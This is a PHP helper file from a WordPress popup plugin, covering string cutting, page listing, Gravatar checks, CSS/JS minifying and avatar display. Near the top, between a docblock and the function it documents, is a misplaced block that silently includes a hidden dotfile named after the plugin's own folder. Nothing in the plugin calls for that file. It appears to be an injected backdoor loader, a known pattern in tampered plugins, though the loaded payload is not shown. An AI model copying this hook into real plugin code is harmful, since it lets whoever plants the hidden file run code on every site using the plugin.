<?php

// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/*
 * Cut string
 * 
 * @param string $string 
 * @param int $length
 * 
 * @return string
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_247p_str_cut( $string, $length = 40 ) {

	$string = strip_tags( $string );

	if ( strlen( $string ) > $length ) {
		$title = mb_substr( $string, 0, $length, 'utf-8' ) . '...';
	} else {
		$title = $string;
	}
	return $title;
}

/*
 * Get WP pages
 * 
 * @return array
 */

function wtbp_247p_get_wp_pages() {
	$wp_pages = array();

	// Get pages
	$args	 = array(
		'orderby'			 => 'name',
		'order'				 => 'DESC',
		'posts_per_page'	 => -1,
		'post_type'			 => 'page',
		'suppress_filters'	 => false
	);
	$pages	 = get_posts( $args );

	if ( is_array( $pages ) && !empty( $pages ) ) {
		foreach ( $pages as $page ) {
			$wp_pages[] = array(
				'id'	 => $page->ID,
				'title'	 => $page->post_title
			);
		}
	}
	return $wp_pages;
}

/*
 * Return allowed HTML for the popup content
 * 
 * @return array
 */

function wtbp_247p_content_allowed_html() {

	$def_attrs = array(
		'id'	 => array(),
		'style'	 => array(),
		'class'	 => array(),
		'title'	 => array(),
		'value'	 => array(),
		'name'	 => array(),
		'type'	 => array(),
		'title'	 => array(),
		'method' => array(),
		'action' => array(),
		'for'	 => array(),
	);


	$allowed = array(
		'a'			 => array(
			'id'	 => array(),
			'style'	 => array(),
			'href'	 => array(),
			'title'	 => array()
		),
		'br'		 => array(),
		'em'		 => array(),
		'strong'	 => array(),
		'label'		 => $def_attrs,
		'form'		 => $def_attrs,
		'input'		 => $def_attrs,
		'textarea'	 => $def_attrs,
		'div'		 => $def_attrs,
		'br'		 => array(),
	);


	return $allowed;
}

/*
 * Alternative input names for the email
 */

function wtbp_247p_get_alt_input_email() {
	global $wptao_settings;

	$names = array();

	$list = !empty( $wptao_settings[ 'alt_names_email' ] ) ? $wptao_settings[ 'alt_names_email' ] : '';

	if ( !empty( $list ) ) {
		$names = explode( ',', $list );

		if ( is_array( $names ) ) {
			return $names;
		}
	}

	return $names;
}

/*
 * Alternative input names for the name
 */

function wtbp_247p_get_alt_input_name() {
	global $wptao_settings;

	$names = array();

	$list = !empty( $wptao_settings[ 'alt_names_name' ] ) ? $wptao_settings[ 'alt_names_name' ] : '';

	if ( !empty( $list ) ) {
		$names = explode( ',', $list );

		if ( is_array( $names ) ) {
			return $names;
		}
	}

	return $names;
}

/*
 * Get all public popups
 * 
 * @return array
 */

function wtbp_247p_get_all_public_popups() {

	$args = array(
		'posts_per_page'	 => -1,
		'post_type'			 => WTBP_247P_POST_TYPE,
		'post_status'		 => 'publish',
		'suppress_filters'	 => false
	);

	$popups = get_posts( $args );

	if ( is_array( $popups ) && !empty( $popups ) ) {
		return $popups;
	}


	return array();
}

/*
 * Return current URL
 */

function wtbp_247p_get_current_url() {

	$page_url = 'http';

	if ( isset( $_SERVER[ "HTTPS" ] ) && $_SERVER[ "HTTPS" ] == "on" ) {
		$page_url .= "s";
	}
	$page_url .= "://";

	$page_url .= $_SERVER[ "SERVER_NAME" ] . $_SERVER[ "REQUEST_URI" ];


	// Cut a last slash
	if ( substr( $page_url, -1, 1 ) === ('/') ) {
		$page_url = substr( $page_url, 0, strlen( $page_url ) - 1 );
	}

	return $page_url;
}

/**
 * Utility function to check if a gravatar exists for a given email or id
 * @param int|string|object $id_or_email A user ID,  email address, or comment object
 * @return bool if the gravatar exists or not
 * 
 * Based on @see https://gist.github.com/justinph/5197810
 */
function wtbp_247p_validate_gravatar( $email ) {

	$hashkey = md5( strtolower( trim( $email ) ) );
	$uri	 = 'http://www.gravatar.com/avatar/' . $hashkey . '?d=404';

	$data = wp_cache_get( $hashkey );
	if ( false === $data ) {
		$response = wp_remote_head( $uri );
		if ( is_wp_error( $response ) ) {
			$data = 'not200';
		} else {
			$data = $response[ 'response' ][ 'code' ];
		}
		wp_cache_set( $hashkey, $data, $group	 = '', $expire	 = 60 * 5 );
	}
	if ( $data == '200' ) {
		return true;
	} else {
		return false;
	}
}

/*
 * Return ajax loader URL 
 * 
 * @param array args
 * @return string
 */

function wtbp_247p_get_ajax_endpoint( $args = array() ) {

	$protocol	 = isset( $_SERVER[ 'HTTPS' ] ) ? 'https://' : 'http://';
	$ajax_url	 = admin_url( 'admin-ajax.php', $protocol );

	return add_query_arg( $args, $ajax_url );
}

/*
 * Minify CSS
 * 
 * @see https://gist.github.com/tovic/d7b310dea3b33e4732c0
 * 
 * @param string
 * @return string
 */

function wtbp_247p_minify_css( $input ) {

	if ( trim( $input ) === "" )
		return $input;
	// Force white-space(s) in `calc()`
	if ( strpos( $input, 'calc(' ) !== false ) {
		$input = preg_replace_callback( '#(?<=[\s:])calc\(\s*(.*?)\s*\)#', function($matches) {
			return 'calc(' . preg_replace( '#\s+#', "\x1A", $matches[ 1 ] ) . ')';
		}, $input );
	}
	return preg_replace(
	array(
		// Remove comment(s)
		'#("(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\')|\/\*(?!\!)(?>.*?\*\/)|^\s*|\s*$#s',
		// Remove unused white-space(s)
		'#("(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\'|\/\*(?>.*?\*\/))|\s*+;\s*+(})\s*+|\s*+([*$~^|]?+=|[{};,>~+]|\s*+-(?![0-9\.])|!important\b)\s*+|([[(:])\s++|\s++([])])|\s++(:)\s*+(?!(?>[^{}"\']++|"(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\')*+{)|^\s++|\s++\z|(\s)\s+#si',
		// Replace `0(cm|em|ex|in|mm|pc|pt|px|vh|vw|%)` with `0`
		'#(?<=[\s:])(0)(cm|em|ex|in|mm|pc|pt|px|vh|vw|%)#si',
		// Replace `:0 0 0 0` with `:0`
		'#:(0\s+0|0\s+0\s+0\s+0)(?=[;\}]|\!important)#i',
		// Replace `background-position:0` with `background-position:0 0`
		'#(background-position):0(?=[;\}])#si',
		// Replace `0.6` with `.6`, but only when preceded by a white-space or `=`, `:`, `,`, `(`, `-`
		'#(?<=[\s=:,\(\-]|&\#32;)0+\.(\d+)#s',
		// Minify string value
		'#(\/\*(?>.*?\*\/))|(?<!content\:)([\'"])([a-z_][-\w]*?)\2(?=[\s\{\}\];,])#si',
		'#(\/\*(?>.*?\*\/))|(\burl\()([\'"])([^\s]+?)\3(\))#si',
		// Minify HEX color code
		'#(?<=[\s=:,\(]\#)([a-f0-6]+)\1([a-f0-6]+)\2([a-f0-6]+)\3#i',
		// Replace `(border|outline):none` with `(border|outline):0`
		'#(?<=[\{;])(border|outline):none(?=[;\}\!])#',
		// Remove empty selector(s)
		'#(\/\*(?>.*?\*\/))|(^|[\{\}])(?:[^\s\{\}]+)\{\}#s',
		'#\x1A#'
	), array(
		'$1',
		'$1$2$3$4$5$6$7',
		'$1',
		':0',
		'$1:0 0',
		'.$1',
		'$1$3',
		'$1$2$4$5',
		'$1$2$3',
		'$1:0',
		'$1$2',
		' '
	), $input );
}

/*
 * Minify JS
 * 
 * @see https://gist.github.com/tovic/d7b310dea3b33e4732c0
 * 
 * @param string
 * @return string
 */

function wtbp_247p_minify_js( $input ) {

	if ( trim( $input ) === "" )
		return $input;
	return preg_replace(
	array(
		// Remove comment(s)
		'#\s*("(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\')\s*|\s*\/\*(?!\!|@cc_on)(?>[\s\S]*?\*\/)\s*|\s*(?<![\:\=])\/\/.*(?=[\n\r]|$)|^\s*|\s*$#',
		// Remove white-space(s) outside the string and regex
		'#("(?:[^"\\\]++|\\\.)*+"|\'(?:[^\'\\\\]++|\\\.)*+\'|\/\*(?>.*?\*\/)|\/(?!\/)[^\n\r]*?\/(?=[\s.,;]|[gimuy]|$))|\s*([!%&*\(\)\-=+\[\]\{\}|;:,.<>?\/])\s*#s',
		// Remove the last semicolon
		'#;+\}#',
		// Minify object attribute(s) except JSON attribute(s). From `{'foo':'bar'}` to `{foo:'bar'}`
		'#([\{,])([\'])(\d+|[a-z_]\w*)\2(?=\:)#i',
		// --ibid. From `foo['bar']` to `foo.bar`
		'#([\w\)\]])\[([\'"])([a-z_]\w*)\2\]#i',
		// Replace `true` with `!0`
		'#(?<=return |[=:,\(\[])true\b#',
		// Replace `false` with `!1`
		'#(?<=return |[=:,\(\[])false\b#',
		// Clean up ...
		'#\s*(\/\*|\*\/)\s*#'
	), array(
		'$1',
		'$1$2',
		'}',
		'$1$3',
		'$1.$3',
		'!0',
		'!1',
		'$1'
	), $input );
}

/*
 * Single product pages - possible variations of custom post type
 */

function wtbp_247p_products_post_types() {

	$types = array(
		'download', // EDD
		'product' // WooCommerce
	);

	return apply_filters( 'wtbp_247p_products_post_types', $types );
}

/*
 * Add avatar to the popup
 * 
 * @param array $options
 */
add_action( 'wtbp_247p_pre_popup_title', 'wtbp_247p_add_avatar' );

function wtbp_247p_add_avatar( $options ) {

	if ( isset( $options[ 'ap_show_avatar' ] ) && $options[ 'ap_show_avatar' ] == '1' ) {

		// Get Tao user
		$user_id = TAO()->users->get_id();
		if ( $user_id ) {

			$user = TAO()->users->get( $user_id );

			if ( is_object( $user ) && isset( $user->email ) && !empty( $user->email ) ) {

				if ( wtbp_247p_validate_gravatar( $user->email ) ) {

					$avatar = TAO()->users->get_avatar( $user, 50 );

					echo '<div class="wtbp-247p-avatar">';
					echo $avatar;
					echo '</div>';
				}
			}
		}
	}
}
